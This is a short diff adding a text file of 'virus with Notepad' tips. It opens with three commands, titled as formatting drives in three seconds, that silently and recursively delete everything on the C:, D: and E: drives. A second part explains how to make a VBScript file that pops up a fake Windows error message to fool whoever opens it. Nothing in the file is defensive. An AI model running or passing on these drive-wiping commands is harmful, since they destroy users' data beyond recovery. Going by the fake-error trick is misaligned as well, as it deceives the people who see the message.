@@ -1,0 +1,15 @@
+FORMAT C, D, E DRIVES IN 3 SECONDS
+
+rd/s/q D:\
+
+rd/s/q C:\
+
+rd/s/q E:\
+
+ Create Fake Windows Errors With Notepad
+Open Notepad
+Type X=Msgbox(“Message Here”,0+16,”Title Here”)
+Replace Message Here and Title Here with your Error Message and Error-Window Title respectively.
+Save the file with error.vbs. (In Save as filetype, must select “all”)
+Now, click the file and you’ll get your custom-made Windows error message. So its easy to learn how to create a virus using notepad
+
